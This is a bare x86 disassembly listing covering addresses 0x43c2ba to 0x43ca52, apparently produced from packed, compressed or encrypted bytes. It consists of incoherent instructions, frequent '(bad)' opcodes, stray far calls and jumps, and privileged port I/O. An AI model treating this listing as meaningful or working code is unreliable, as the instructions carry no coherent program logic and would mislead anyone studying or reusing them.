  43c2ba:	inc    ecx
  43c2bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c2bc:	push   0x29
  43c2be:	cmp    DWORD PTR [edx+eax*4-0x46dfff0f],0x201c9cf7
  43c2c9:	rcr    eax,0x70
  43c2cc:	and    eax,0xd9cea2b2
  43c2d1:	retf   0x4021
  43c2d4:	mov    cl,0x5d
  43c2d6:	jle    0x43c2ca
  43c2d8:	and    al,BYTE PTR [ecx+eax*8-0x72]
  43c2dc:	xchg   edx,eax
  43c2dd:	adc    cl,BYTE PTR [ebx]
  43c2df:	push   esi
  43c2e0:	mov    BYTE PTR [ebp-0x5a],0x9a
  43c2e4:	sub    eax,0xfe10eae8
  43c2e9:	dec    esi
  43c2ea:	and    edi,DWORD PTR [edi+ebp*2+0x37c0f89c]
  43c2f1:	mov    WORD PTR [edx+0xfeba03],gs
  43c2f7:	xor    dh,BYTE PTR [eax+edx*4+0xa35b4be]
  43c2fe:	xchg   edx,eax
  43c2ff:	lods   al,BYTE PTR ds:[esi]
  43c300:	test   DWORD PTR [edx],0xfc0a168
  43c306:	push   ebx
  43c307:	int    0x60
  43c309:	shl    DWORD PTR [eax],0x8d
  43c30c:	adc    DWORD PTR [esi+0x20],0x96480e3
  43c313:	xchg   edx,eax
  43c314:	(bad)  
  43c316:	imul   eax,DWORD PTR [ebx-0x47a54d6d],0x4b801460
  43c320:	push   ss
  43c321:	xor    al,0xd8
  43c323:	pop    es
  43c324:	pop    esp
  43c325:	(bad)  
  43c326:	cmp    al,0x94
  43c328:	push   cs
  43c329:	mov    dh,0xf6
  43c32b:	inc    ecx
  43c32c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c32d:	and    BYTE PTR [esi-0x323bce1f],0xe6
  43c334:	xchg   edx,eax
  43c335:	pop    esp
  43c336:	pop    es
  43c337:	jp     0x43c381
  43c339:	jecxz  0x43c33e
  43c33b:	xchg   dl,cl
  43c33d:	out    dx,eax
  43c33e:	adc    al,0xb8
  43c340:	adc    BYTE PTR [edx+0x9],0xed
  43c344:	leave  
  43c345:	ret    0x6a4c
  43c348:	add    al,0xac
  43c34a:	mov    eax,ds:0x9eeb4293
  43c34f:	mov    edx,esi
  43c351:	loopne 0x43c30b
  43c353:	dec    esi
  43c354:	or     BYTE PTR [edx+edx*4+0x24283292],dl
  43c35b:	call   0x3082:0x50208601
  43c362:	lods   eax,DWORD PTR ds:[esi]
  43c363:	loope  0x43c326
  43c365:	sub    BYTE PTR [eax],dl
  43c367:	jg     0x43c397
  43c369:	push   ds
  43c36a:	inc    esp
  43c36b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c36c:	add    al,0x44
  43c36e:	push   0x20
  43c370:	scas   al,BYTE PTR es:[edi]
  43c371:	test   eax,0x98aa3c08
  43c376:	jg     0x43c32e
  43c378:	mov    ds:0xbb3880e2,al
  43c37d:	fs pop eax
  43c37f:	retf   0x934b
  43c382:	mov    BYTE PTR [eax-0x71edea5f],ah
  43c388:	out    dx,al
  43c389:	retf   0xf812
  43c38c:	lock retf 0xd836
  43c390:	dec    edi
  43c391:	rcr    BYTE PTR [esi],0x46
  43c394:	sub    ah,dl
  43c396:	es int 0x4
  43c399:	aad    0xb7
  43c39b:	mov    al,0xa1
  43c39d:	push   es
  43c39e:	ins    BYTE PTR es:[edi],dx
  43c39f:	enter  0x2fc7,0x34
  43c3a3:	jmp    0x7969:0x58497612
  43c3aa:	dec    ecx
  43c3ab:	nop
  43c3ac:	test   BYTE PTR [eax-0x16],ah
  43c3af:	sub    eax,0x3c867014
  43c3b4:	xchg   esi,eax
  43c3b5:	(bad)  
  43c3b6:	sbb    BYTE PTR [eax+0x60],bl
  43c3b9:	(bad)  
  43c3ba:	or     al,0x6a
  43c3bc:	and    dh,dh
  43c3be:	fiadd  WORD PTR fs:[ebp-0x4bf7e087]
  43c3c5:	xchg   DWORD PTR [edx+0x61],ecx
  43c3c8:	mov    ?,WORD PTR [eax-0xbce0391]
  43c3ce:	add    DWORD PTR [ebx+ebp*2-0x47a883ef],esi
  43c3d5:	sbb    al,ah
  43c3d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c3d8:	xor    eax,0x6b4a5418
  43c3dd:	mov    al,ds:0x84426a16
  43c3e2:	mov    dh,0xe2
  43c3e4:	add    DWORD PTR [edx],0x6e
  43c3e7:	jbe    0x43c38e
  43c3e9:	fwait
  43c3ea:	lods   al,BYTE PTR ds:[esi]
  43c3eb:	jmp    0x9c16:0xb7dad890
  43c3f2:	out    dx,al
  43c3f3:	pop    ebp
  43c3f4:	loop   0x43c3d3
  43c3f6:	adc    BYTE PTR [edx+esi*4+0x56],bh
  43c3fa:	cmp    eax,0x8f483652
  43c3ff:	les    edi,FWORD PTR [esp+eiz*4+0x25785b52]
  43c406:	push   esp
  43c407:	test   bh,bh
  43c409:	cs mov eax,0x2caebca
  43c40f:	jle    0x43c3d9
  43c411:	rol    ch,1
  43c413:	xor    BYTE PTR [esi],cl
  43c415:	sbb    edi,DWORD PTR [esi-0x4f55f3b0]
  43c41b:	pusha  
  43c41c:	and    eax,0x29838038
  43c421:	inc    eax
  43c422:	sbb    eax,0xa0bee410
  43c427:	pop    ss
  43c428:	mov    al,ds:0x83583535
  43c42d:	retf   0x5ed5
  43c430:	jo     0x43c47e
  43c432:	cwde   
  43c433:	inc    BYTE PTR [eax]
  43c435:	aam    0x67
  43c437:	inc    ecx
  43c438:	int    0xee
  43c43a:	fld    QWORD PTR [ecx-0x42fb4910]
  43c440:	adc    al,0xf5
  43c442:	xchg   ecx,eax
  43c443:	call   0x221a7870
  43c448:	dec    dx
  43c44a:	cmp    ebx,DWORD PTR [esi]
  43c44c:	sub    eax,0x1d06f5ac
  43c451:	mov    gs,WORD PTR ds:0xa2278c91
  43c457:	sub    DWORD PTR [esi+edx*2+0x7c19ad98],0x40
  43c45f:	mov    ebx,0xcae807ac
  43c464:	cmp    eax,ecx
  43c466:	sub    eax,0x70a2386c
  43c46b:	fldlg2 
  43c46d:	sub    DWORD PTR [ecx-0x57],ebx
  43c470:	fadd   DWORD PTR [ecx-0x18]
  43c473:	sub    dl,dl
  43c475:	into   
  43c476:	jns    0x43c424
  43c478:	(bad)  
  43c479:	adc    eax,0x47a14df1
  43c47e:	or     al,0xea
  43c480:	cmp    al,0x0
  43c482:	xchg   DWORD PTR [eax-0x298f1ca5],ecx
  43c488:	add    BYTE PTR [eax-0x5efbafa6],ah
  43c48e:	sub    eax,esi
  43c490:	or     dl,BYTE PTR [edi+0x136f5482]
  43c496:	fild   DWORD PTR [ebx]
  43c498:	jl     0x43c477
  43c49a:	mov    eax,0x124039ef
  43c49f:	push   ds
  43c4a0:	xchg   ebx,eax
  43c4a1:	shr    BYTE PTR [edx],0x94
  43c4a4:	nop
  43c4a5:	pop    ss
  43c4a6:	cld    
  43c4a7:	call   0xb430:0x52baa82f
  43c4ae:	repz cmp al,0xca
  43c4b1:	lock add ah,cl
  43c4b4:	sub    esp,ebx
  43c4b6:	add    dh,BYTE PTR [ecx-0x59533d5f]
  43c4bc:	daa    
  43c4bd:	cmp    BYTE PTR [esi],al
  43c4bf:	cli    
  43c4c0:	cmp    BYTE PTR [ecx+0x3e9874c8],ch
  43c4c6:	out    0xb8,al
  43c4c8:	call   0x12529f84
  43c4cd:	(bad)  
  43c4ce:	jl     0x43c494
  43c4d0:	retf   0x5abe
  43c4d3:	or     dl,al
  43c4d5:	dec    ebx
  43c4d6:	jmp    0x804282b4
  43c4db:	add    al,0x58
  43c4dd:	std    
  43c4de:	and    dh,ch
  43c4e0:	sub    DWORD PTR fs:[esi+0x780ffb18],0xffffffdb
  43c4e8:	cmp    DWORD PTR [esi+0xb],0x8
  43c4ec:	fcmovb st,st(5)
  43c4ee:	(bad)  
  43c4ef:	and    eax,0x34087304
  43c4f4:	mov    al,ds:0x2e106b36
  43c4f9:	mov    BYTE PTR [esi+0x1c],dh
  43c4fc:	fs es jo 0x43c509
  43c500:	sub    al,0x84
  43c502:	je     0x43c4e4
  43c504:	les    eax,FWORD PTR [esi+0x1e]
  43c507:	jl     0x43c53b
  43c509:	je     0x43c565
  43c50b:	idiv   BYTE PTR [ebx]
  43c50d:	and    esi,esp
  43c50f:	push   ds
  43c510:	mov    ds:0xc680eac5,eax
  43c515:	addr16 pusha 
  43c517:	pop    ecx
  43c518:	and    DWORD PTR [esi+0x41bfcd3a],ecx
  43c51e:	and    al,0x4c
  43c520:	fst    QWORD PTR es:[eax+eax*1-0x76]
  43c525:	popf   
  43c526:	add    BYTE PTR [ebx],dh
  43c528:	cmp    bl,ch
  43c52a:	and    al,bl
  43c52c:	rcpps  xmm0,XMMWORD PTR [esi]
  43c52f:	outs   dx,DWORD PTR ds:[esi]
  43c530:	mov    esp,0x565d3e3e
  43c535:	imul   ebx,ecx,0x8ab838ad
  43c53b:	(bad)  
  43c53d:	xor    cl,BYTE PTR [ebp+0x40]
  43c540:	pop    ss
  43c541:	add    dh,BYTE PTR [esi]
  43c543:	pop    edx
  43c544:	lods   al,BYTE PTR ds:[esi]
  43c545:	int3   
  43c546:	sub    eax,0x1052a34f
  43c54b:	mov    al,ds:0x5112cec6
  43c550:	and    eax,0xa2018419
  43c555:	cmp    al,0x57
  43c557:	xor    bh,BYTE PTR [esi+esi*4]
  43c55a:	aad    0x60
  43c55c:	add    eax,0x4a51f34a
  43c561:	adc    DWORD PTR [ebx-0x56fdd3fb],0xb45a3bd2
  43c56b:	hlt    
  43c56c:	add    al,0x63
  43c56e:	leave  
  43c56f:	mov    ebp,0x71302016
  43c574:	ret    0x14e6
  43c577:	lods   al,BYTE PTR ds:[esi]
  43c578:	dec    edi
  43c579:	into   
  43c57a:	je     0x43c5e8
  43c57c:	push   eax
  43c57d:	enter  0xf2aa,0x3
  43c581:	jp     0x43c54b
  43c583:	rcl    DWORD PTR [eax+0x2cfa93c2],cl
  43c589:	(bad)  
  43c58a:	mov    ch,0xa2
  43c58c:	shr    BYTE PTR [ebx+0x36c2a9a8],cl
  43c592:	call   0x6d54:0x995cfb58
  43c599:	leave  
  43c59a:	mov    cl,0x3e
  43c59c:	push   cs
  43c59d:	shl    DWORD PTR [edx-0x6e],cl
  43c5a0:	lea    edx,[ebx]
  43c5a2:	cwde   
  43c5a3:	mov    eax,0x1c405c16
  43c5a8:	fs add ebp,esi
  43c5ab:	push   0x6a54a26d
  43c5b0:	or     BYTE PTR [esi],ch
  43c5b2:	loopne 0x43c57a
  43c5b4:	stos   BYTE PTR es:[edi],al
  43c5b5:	push   esp
  43c5b6:	test   BYTE PTR [edx],bl
  43c5b8:	(bad)  
  43c5b9:	stos   DWORD PTR es:[edi],eax
  43c5ba:	inc    esi
  43c5bb:	(bad)  
  43c5bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c5bd:	mov    ds:0x476d8e9,al
  43c5c2:	loope  0x43c630
  43c5c4:	loopne 0x43c550
  43c5c6:	and    bl,BYTE PTR [eax]
  43c5c8:	adc    eax,DWORD PTR [ebx]
  43c5ca:	or     cl,BYTE PTR [eax]
  43c5cc:	idiv   dh
  43c5ce:	loop   0x43c5f6
  43c5d0:	jne    0x43c5fa
  43c5d2:	push   0x21
  43c5d4:	out    0xc6,eax
  43c5d6:	jmp    0x649a7a27
  43c5db:	nop
  43c5dc:	sahf   
  43c5dd:	jmp    0x549a:0x4bca8c16
  43c5e4:	push   ebx
  43c5e5:	inc    ebx
  43c5e6:	test   BYTE PTR [esi],cl
  43c5e8:	mov    al,ds:0x32bc607
  43c5ed:	fwait
  43c5ee:	mov    WORD PTR [eax-0x72],es
  43c5f1:	inc    edi
  43c5f2:	js     0x43c5c4
  43c5f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c5f5:	call   0xfb09:0x7489f65a
  43c5fc:	mov    al,cs:0x7ecd2f16
  43c602:	retf   
  43c603:	fcom   DWORD PTR [esp+ebp*8-0x7613a329]
  43c60a:	jbe    0x43c5f4
  43c60c:	out    dx,eax
  43c60d:	and    ecx,DWORD PTR [ebp+0x54]
  43c610:	dec    eax
  43c611:	cs adc eax,edi
  43c614:	mov    ch,0x9
  43c616:	sub    al,0x30
  43c618:	mov    dl,0xde
  43c61a:	dec    ebp
  43c61b:	and    eax,0xc38761f0
  43c620:	(bad)  
  43c621:	rol    DWORD PTR [esi],1
  43c623:	mov    edx,0x9b4320ff
  43c628:	jle    0x43c62f
  43c62a:	cmp    dh,ah
  43c62c:	add    eax,DWORD PTR [eax]
  43c62e:	in     al,0xbe
  43c630:	test   BYTE PTR [ecx+0x2b819a96],ch
  43c636:	cmp    BYTE PTR [ecx+0x5ba20c28],cl
  43c63c:	add    eax,0x3604cadf
  43c641:	scas   al,BYTE PTR es:[edi]
  43c642:	xchg   esi,eax
  43c643:	inc    edi
  43c644:	push   ss
  43c645:	push   esp
  43c646:	mov    ch,0x47
  43c648:	sub    bh,BYTE PTR [esi]
  43c64a:	pop    eax
  43c64b:	mov    BYTE PTR [eax-0x37],ah
  43c64e:	dec    eax
  43c64f:	loope  0x43c629
  43c651:	mov    al,ds:0x3800c9e1
  43c656:	sub    cl,BYTE PTR [esi+edi*2+0x4d50d6a4]
  43c65d:	and    BYTE PTR [eax],dh
  43c65f:	inc    esp
  43c660:	xchg   DWORD PTR [edx],ecx
  43c662:	loopne 0x43c672
  43c664:	or     DWORD PTR [esi],eax
  43c666:	or     eax,0xae81a24
  43c66b:	fwait
  43c66c:	jge    0x43c632
  43c66e:	adc    DWORD PTR [edx+ecx*8],esp
  43c671:	repz inc DWORD PTR [eax-0x5a]
  43c675:	stc    
  43c676:	mov    dl,BYTE PTR [edi+eax*1-0x7c]
  43c67a:	dec    edi
  43c67b:	les    ecx,FWORD PTR [edi+0x5c]
  43c67e:	mov    al,ds:0x89e12e89
  43c683:	push   eax
  43c684:	mov    esi,0xd8984600
  43c689:	gs cmp al,0xd0
  43c68c:	pop    esi
  43c68d:	cmp    eax,0x341f5b0b
  43c692:	push   ds
  43c693:	jl     0x43c69b
  43c695:	aam    0x10
  43c697:	loopne 0x43c6ad
  43c699:	sub    al,0x68
  43c69b:	xor    cl,BYTE PTR [eax+0x4]
  43c69e:	out    dx,al
  43c69f:	ins    BYTE PTR es:[edi],dx
  43c6a0:	xlat   BYTE PTR ds:[ebx]
  43c6a1:	scas   eax,DWORD PTR es:[edi]
  43c6a2:	js     0x43c69e
  43c6a4:	lods   al,BYTE PTR ds:[esi]
  43c6a5:	clc    
  43c6a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c6a7:	or     edx,ebp
  43c6a9:	mov    DWORD PTR [ecx-0x4adda400],esp
  43c6af:	ins    BYTE PTR es:[edi],dx
  43c6b0:	xchg   esp,eax
  43c6b1:	fisub  DWORD PTR [ebx+0xac56c05]
  43c6b7:	out    0x1d,al
  43c6b9:	sbb    eax,0x8a920484
  43c6be:	or     eax,0x6a12dc9c
  43c6c3:	xor    ah,BYTE PTR [eax-0x54]
  43c6c6:	cs pop ecx
  43c6c8:	dec    esi
  43c6c9:	mov    ds:0x891c1ec2,eax
  43c6ce:	jae    0x43c6b2
  43c6d0:	sub    ch,dl
  43c6d2:	inc    edx
  43c6d3:	pushf  
  43c6d4:	lea    ecx,[esi+0x11]
  43c6d7:	sbb    al,0x44
  43c6d9:	call   0xba58:0x6cd03224
  43c6e0:	sbb    bh,BYTE PTR ds:0xe6b6a8c8
  43c6e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c6e7:	mov    dh,cl
  43c6e9:	mov    esp,0x1c093a92
  43c6ee:	out    0x5a,al
  43c6f0:	jb     0x43c6e0
  43c6f2:	out    0x80,al
  43c6f4:	jo     0x43c73b
  43c6f6:	jle    0x43c710
  43c6f8:	and    BYTE PTR [ebp+ebp*8-0x30],bh
  43c6fc:	push   esi
  43c6fd:	sti    
  43c6fe:	in     eax,0xd9
  43c700:	add    ah,dh
  43c702:	pusha  
  43c703:	mov    eax,0x4c8a2add
  43c708:	(bad)  
  43c709:	hlt    
  43c70a:	and    DWORD PTR [eax+esi*4],ebp
  43c70d:	push   eax
  43c70e:	push   ss
  43c70f:	test   BYTE PTR [ebp-0x1656476b],bh
  43c715:	dec    eax
  43c716:	inc    esp
  43c717:	mov    ch,0x40
  43c719:	or     al,bh
  43c71b:	mov    esi,0x2e8187c1
  43c720:	mov    WORD PTR [edi+0x566ccb4],?
  43c726:	and    BYTE PTR [ebx-0x2f],dl
  43c729:	sbb    esi,DWORD PTR [edi+eiz*1+0x70]
  43c72d:	dec    eax
  43c72e:	and    ch,al
  43c730:	pop    edx
  43c731:	push   eax
  43c732:	aad    0x44
  43c734:	or     dl,BYTE PTR [eax+eax*4-0x5d]
  43c738:	add    BYTE PTR [ebp-0x4a],0x7d
  43c73c:	ret    
  43c73d:	or     BYTE PTR [ebp+0x4a494c7a],ah
  43c743:	sbb    dh,cl
  43c745:	mov    edx,0x83f0b0f6
  43c74a:	pop    edx
  43c74b:	pop    edx
  43c74c:	fucomi st,st(6)
  43c74e:	push   esi
  43c74f:	les    esp,FWORD PTR [edx]
  43c751:	fwait
  43c752:	xchg   esi,eax
  43c753:	ins    DWORD PTR es:[edi],dx
  43c754:	cmp    BYTE PTR [edx-0x72],cl
  43c757:	aam    0x5
  43c759:	dec    eax
  43c75a:	cli    
  43c75b:	sub    bh,BYTE PTR [ebx+0x40]
  43c75e:	test   al,0x42
  43c760:	cmp    BYTE PTR [edx-0x24],dh
  43c763:	sti    
  43c764:	and    bh,ah
  43c766:	mov    al,ds:0x77c488e8
  43c76b:	push   ebx
  43c76c:	call   0x40c1:0x2e5fecfa
  43c773:	stos   BYTE PTR es:[edi],al
  43c774:	push   ds
  43c775:	ins    BYTE PTR es:[edi],dx
  43c776:	add    BYTE PTR [esi+0x2b],bh
  43c779:	nop
  43c77a:	push   cs
  43c77b:	lods   al,BYTE PTR ds:[esi]
  43c77c:	test   ah,al
  43c77e:	push   0xffffffc0
  43c780:	ins    DWORD PTR es:[edi],dx
  43c781:	call   0x433f298b
  43c786:	rol    BYTE PTR [edx-0x64],0xb8
  43c78a:	inc    edx
  43c78b:	ss and dh,al
  43c78e:	cwde   
  43c78f:	jp     0x43c71f
  43c791:	jecxz  0x43c72d
  43c793:	xchg   edx,eax
  43c794:	ret    
  43c795:	add    ah,BYTE PTR [ecx-0x51]
  43c798:	and    al,0xbd
  43c79a:	cs aaa 
  43c79c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c79d:	jmp    0xaa87:0x5b402471
  43c7a4:	sub    BYTE PTR [esi],0x71
  43c7a7:	(bad)  
  43c7a8:	(bad)  
  43c7a9:	scas   eax,DWORD PTR es:[edi]
  43c7aa:	sub    eax,0x6b0e0eb4
  43c7af:	cmp    al,bh
  43c7b1:	shl    bl,0x2c
  43c7b4:	dec    edx
  43c7b5:	mov    ah,0x3
  43c7b7:	adc    eax,ebx
  43c7b9:	rcr    DWORD PTR [edx+0x28ec03a],cl
  43c7bf:	repz adc eax,0x7f8ae8
  43c7c5:	loopne 0x43c76c
  43c7c7:	inc    edx
  43c7c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c7c9:	fisubr WORD PTR [eax+0x3dd001e9]
  43c7cf:	and    dl,BYTE PTR [esi]
  43c7d1:	stos   DWORD PTR es:[edi],eax
  43c7d2:	cmp    cl,BYTE PTR ds:0xb112f880
  43c7d8:	add    ah,BYTE PTR [ebp+0x7d]
  43c7db:	push   esi
  43c7dc:	(bad)  [esi+0x70]
  43c7df:	adc    dh,BYTE PTR [eax+0x52]
  43c7e2:	enter  0x1ab6,0x30
  43c7e6:	push   ds
  43c7e7:	xchg   ecx,eax
  43c7e8:	push   0xc1d63446
  43c7ed:	out    0xb,eax
  43c7ef:	scas   eax,DWORD PTR es:[edi]
  43c7f0:	lods   al,BYTE PTR ds:[esi]
  43c7f1:	pop    ds
  43c7f2:	dec    esi
  43c7f3:	adc    al,0xc4
  43c7f6:	jne    0x43c7db
  43c7f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c7f9:	mov    dh,0xa2
  43c7fb:	inc    ebx
  43c7fc:	push   es
  43c7fd:	push   ebp
  43c7fe:	sahf   
  43c7ff:	pusha  
  43c800:	mov    dl,0x70
  43c802:	inc    ebp
  43c803:	pusha  
  43c804:	in     eax,dx
  43c805:	mov    dh,0xf4
  43c807:	clc    
  43c808:	out    dx,al
  43c809:	in     al,0xfb
  43c80b:	rol    BYTE PTR [edx],0xd8
  43c80e:	mov    esi,0x838854e2
  43c813:	rep ins BYTE PTR es:[edi],dx
  43c815:	stos   BYTE PTR es:[edi],al
  43c816:	jne    0x43c7d4
  43c818:	add    DWORD PTR [edx+0x25],ecx
  43c81b:	stc    
  43c81c:	add    al,bh
  43c81e:	rcr    BYTE PTR [eax-0x18],cl
  43c821:	aas    
  43c822:	push   ebx
  43c823:	cmp    BYTE PTR [ebp+esi*4+0x6cbe71ba],al
  43c82a:	sbb    dl,0xae
  43c82d:	sub    BYTE PTR [esi+edx*2],dh
  43c830:	enter  0xa0a2,0x40
  43c834:	jecxz  0x43c821
  43c836:	adc    al,0x9f
  43c838:	mov    eax,ds:0x397e04d7
  43c83d:	mov    bh,BYTE PTR [ecx+0x5d088262]
  43c843:	pop    edx
  43c844:	fwait
  43c845:	push   edx
  43c846:	(bad)  
  43c847:	sub    al,0x42
  43c849:	sbb    eax,0xb954054b
  43c84e:	push   0x29da20a2
  43c853:	stos   DWORD PTR es:[edi],eax
  43c854:	or     BYTE PTR [eax],dh
  43c856:	loopne 0x43c7fe
  43c858:	aad    0x85
  43c85a:	push   esi
  43c85b:	or     DWORD PTR [ebx+0x2a],edi
  43c85e:	mov    esi,DWORD PTR [edx+esi*4+0x36]
  43c862:	cmc    
  43c863:	adc    BYTE PTR [eax],ah
  43c865:	jo     0x43c88f
  43c867:	jecxz  0x43c7f0
  43c869:	enter  0x3ffd,0x66
  43c86d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c86e:	(bad)  
  43c86f:	mov    al,0xe9
  43c871:	push   esp
  43c872:	int3   
  43c873:	or     dh,dl
  43c875:	mov    esi,0x26689eba
  43c87a:	les    edx,FWORD PTR [esp+edx*2]
  43c87d:	add    BYTE PTR [ebp-0x58],dl
  43c880:	ds jle 0x43c822
  43c883:	mov    ds:0xed200e3d,al
  43c888:	adc    BYTE PTR [edx+ebp*8-0x4e2f9794],al
  43c88f:	push   0xe6966196
  43c894:	out    dx,al
  43c895:	loope  0x43c8cf
  43c897:	push   ss
  43c898:	cmc    
  43c899:	or     DWORD PTR [eax],ebx
  43c89b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c89c:	popf   
  43c89d:	and    bh,ah
  43c89f:	outs   dx,DWORD PTR ds:[esi]
  43c8a0:	inc    ebx
  43c8a1:	fwait
  43c8a2:	or     DWORD PTR [eax+eax*2+0x47],edx
  43c8a6:	jmp    0xe1c0:0xc9f116e6
  43c8ad:	add    DWORD PTR [eax+0x1a],eax
  43c8b0:	data16 fprem 
  43c8b3:	dec    ecx
  43c8b4:	cmp    al,0xa8
  43c8b6:	retf   0xee07
  43c8b9:	push   ds
  43c8ba:	popf   
  43c8bb:	or     edi,esp
  43c8bd:	test   BYTE PTR [esi-0x28],bl
  43c8c0:	jns    0x43c86f
  43c8c2:	ret    0xb6b6
  43c8c5:	push   cs
  43c8c6:	inc    cx
  43c8c8:	pop    edi
  43c8c9:	ror    BYTE PTR [esi],1
  43c8cb:	jl     0x43c8d9
  43c8cd:	mov    DWORD PTR [edx-0x56],esi
  43c8d0:	ins    DWORD PTR es:[edi],dx
  43c8d1:	mov    dl,0x1d
  43c8d3:	test   al,0x88
  43c8d5:	pop    esi
  43c8d6:	xor    al,0xa
  43c8d8:	push   ecx
  43c8d9:	das    
  43c8da:	call   0x9c6c:0x7a897c06
  43c8e1:	pop    es
  43c8e2:	fnclex 
  43c8e4:	mov    bl,BYTE PTR [ebx]
  43c8e6:	scas   al,BYTE PTR es:[edi]
  43c8e7:	ret    0xde04
  43c8ea:	mov    eax,0xd962ac36
  43c8ef:	les    edx,FWORD PTR [eax+ebx*8+0x7]
  43c8f3:	or     DWORD PTR [esp+ebp*1-0x7283c5fc],ebx
  43c8fa:	call   0xd070:0x2e28d642
  43c901:	dec    esp
  43c902:	lods   al,BYTE PTR ds:[esi]
  43c903:	daa    
  43c904:	cmc    
  43c905:	mov    ds:0x2b1c2b61,al
  43c90a:	push   cs
  43c90b:	inc    eax
  43c90c:	dec    ecx
  43c90d:	rol    BYTE PTR [ecx-0x174affc1],cl
  43c913:	inc    esp
  43c914:	jp     0x43c91c
  43c916:	inc    ebx
  43c917:	dec    esp
  43c918:	add    BYTE PTR [ecx+0x7b],ah
  43c91b:	adc    eax,0x7e90f800
  43c920:	lock mov edx,0xb6aaadf
  43c926:	or     ecx,edx
  43c928:	push   esp
  43c929:	in     eax,dx
  43c92a:	push   esp
  43c92b:	icebp  
  43c92c:	inc    eax
  43c92d:	shl    BYTE PTR [esi-0x1368e3b7],0x2
  43c934:	sbb    dl,bl
  43c936:	sbb    BYTE PTR [edx-0x3b],0xa5
  43c93a:	mov    cl,bl
  43c93c:	hlt    
  43c93d:	xor    DWORD PTR [esi+ecx*4],ebx
  43c940:	(bad)  
  43c941:	dec    edi
  43c942:	sbb    ebx,DWORD PTR [ebp+0x64]
  43c945:	and    esp,DWORD PTR [edx]
  43c947:	cmp    al,0x71
  43c949:	jecxz  0x43c950
  43c94b:	test   al,0x97
  43c94d:	scas   al,BYTE PTR es:[edi]
  43c94e:	rol    BYTE PTR [ebx-0x7e],0xdc
  43c952:	mov    ebx,0x2ba82502
  43c957:	xor    bh,BYTE PTR [ecx]
  43c959:	add    ah,BYTE PTR [ebx+ebx*1]
  43c95c:	inc    edi
  43c95d:	inc    esi
  43c95e:	aad    0xa3
  43c960:	mov    BYTE PTR [esi-0x77],ah
  43c963:	(bad)  
  43c964:	and    eax,0x6e45b0a1
  43c969:	push   esp
  43c96a:	mov    esp,0x7c8810c8
  43c96f:	ins    BYTE PTR es:[edi],dx
  43c970:	sbb    dl,dh
  43c972:	xor    bh,dh
  43c974:	mov    esp,0x5acf2888
  43c979:	sub    ebp,DWORD PTR [edx]
  43c97b:	adc    BYTE PTR [eax+0x30],cl
  43c97e:	fwait
  43c97f:	jp     0x43c91e
  43c981:	xchg   esp,eax
  43c982:	fisub  WORD PTR [eax+0x102520b1]
  43c988:	mov    edx,0x4b25e38
  43c98d:	pop    ecx
  43c98e:	and    eax,0x308a94e4
  43c993:	adc    BYTE PTR [eax],dl
  43c995:	mov    eax,0x26d0aa92
  43c99a:	jmp    0xf6a9:0x27d8361b
  43c9a1:	mov    ecx,0xd04220dc
  43c9a6:	outs   dx,BYTE PTR ds:[esi]
  43c9a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c9a8:	inc    ecx
  43c9a9:	pop    ds
  43c9aa:	xchg   DWORD PTR [eax],eax
  43c9ac:	shl    BYTE PTR [esi+0x67544ad],1
  43c9b2:	enter  0xac17,0x6f
  43c9b6:	dec    eax
  43c9b7:	inc    eax
  43c9b8:	add    eax,0xd2f042d0
  43c9bd:	push   edx
  43c9be:	adc    eax,0x2ac9feae
  43c9c3:	std    
  43c9c4:	push   es
  43c9c5:	aad    0xc
  43c9c7:	rol    dh,0xea
  43c9ca:	cmp    BYTE PTR [ecx+0x54412e8b],bl
  43c9d0:	sub    bl,cl
  43c9d2:	or     al,0x86
  43c9d4:	mov    WORD PTR [edi],?
  43c9d6:	outs   dx,DWORD PTR ds:[esi]
  43c9d7:	push   ebp
  43c9d8:	and    DWORD PTR [esi],esp
  43c9da:	fs sbb al,0x90
  43c9dd:	call   0x209f2075
  43c9e2:	mov    ds:0x90a0c0b0,al
  43c9e7:	out    dx,al
  43c9e8:	mov    ah,0x5b
  43c9ea:	xor    ebp,edx
  43c9ec:	sar    BYTE PTR [ebx+edi*1-0x16],cl
  43c9f0:	hlt    
  43c9f1:	mov    dl,0x5e
  43c9f3:	inc    eax
  43c9f4:	stc    
  43c9f5:	push   0x7a
  43c9f7:	or     eax,0xf1bbbc00
  43c9fc:	dec    esp
  43c9fd:	(bad)  
  43c9fe:	mov    al,0xb9
  43ca00:	add    eax,0x9e91f574
  43ca05:	mov    eax,0xda178d66
  43ca0a:	add    ecx,edx
  43ca0c:	clc    
  43ca0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ca0e:	test   BYTE PTR [ebx-0x4a156cd8],0xe0
  43ca15:	push   ebx
  43ca16:	push   edx
  43ca17:	xchg   esp,eax
  43ca18:	push   0x71
  43ca1a:	dec    esi
  43ca1b:	or     al,0x5a
  43ca1d:	lods   al,BYTE PTR ds:[esi]
  43ca1e:	nop
  43ca1f:	icebp  
  43ca20:	and    al,0xf2
  43ca22:	adc    dl,BYTE PTR [edx-0x78]
  43ca25:	imul   ebp,eax,0x33
  43ca28:	add    al,0xce
  43ca2a:	or     DWORD PTR [esi-0x384f3faa],esp
  43ca30:	aam    0xe9
  43ca32:	lea    ecx,[esi]
  43ca34:	dec    ebx
  43ca35:	or     eax,0x286d2ce2
  43ca3a:	jo     0x43c9cc
  43ca3c:	ror    ah,0xe6
  43ca3f:	or     bl,dl
  43ca41:	pop    eax
  43ca42:	pop    ebp
  43ca43:	test   BYTE PTR [esi+0x162cf6aa],bl
  43ca49:	fcmovnbe st,st(4)
  43ca4b:	mov    ch,BYTE PTR [edi+0x3e]
  43ca4e:	data16 lods al,BYTE PTR cs:[esi]
  43ca51:	cld    
  43ca52:	js     0x43ca76
